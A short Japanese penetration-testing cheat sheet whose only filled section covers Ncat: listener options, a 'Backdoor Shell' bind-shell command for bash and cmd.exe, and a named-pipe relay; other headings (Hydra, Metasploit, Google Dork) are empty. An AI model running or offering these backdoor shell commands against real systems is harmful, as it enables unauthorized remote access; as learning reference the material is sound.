# high-frequency-tips
頻繁に使うコマンドのCheatSheet

## Ncat
オプション：
```
-l：リッスン
-n：名前解決を行わない
-k：keep-open。コネクション確立後も別クライアントの接続をリッスンする
```
ヘルプの表示：
```
$nc -help
````
ポート1234でリッスン：
````
$ncat -nlv 1234
````
Backdoor Shell：
````
$nc -l -p [port] -e /bin/bash
OR
C:\>nc [port] -e cmd.exe
````
Netcat Relays(Listener-to-Listner)：
````
$cd /tmp
$mknod backpipe p
$nc -l -p [port] 0<backpipe | nc -l -p [port] | tee backpipe
````
## SSH
## FTP
## SCP
## Hydra
## John the Ripper
## HashCat
## Metasploit Framework
 ### Meterpreter
 ### msfvenom
 ### Pivot
## Network
 ### Routing
 ### ICMP
 ### ARP
## Google Dork
